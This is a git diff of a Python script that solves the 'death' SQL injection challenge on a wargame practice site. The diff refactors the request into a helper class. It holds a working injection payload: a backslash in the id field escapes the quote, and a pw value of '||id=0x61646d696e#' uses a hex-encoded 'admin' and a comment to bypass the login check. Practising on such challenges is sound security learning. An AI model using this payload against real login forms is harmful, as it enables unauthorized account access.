@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def main():
@@ -16,14 +17,16 @@ def main():
     '''
 
     url = "https://modsec.rubiya.kr/chall/death_0128e8a86066ca4f148444f0e99f4707.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
+    other_param = {'id': '\\'}
 
-    param = dict(id='\\', pw='||id=0x61646d696e#')
-
-    response = los.get_request(url, param, cook)
-
+    payload = '||id=0x61646d696e#'
+    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
+    response = p.my_request()
     if 'Clear!' in response:
-        print('DEATH Clear!')
+        print('\nDEATH Clear!')
 
 
 if __name__ == '__main__':
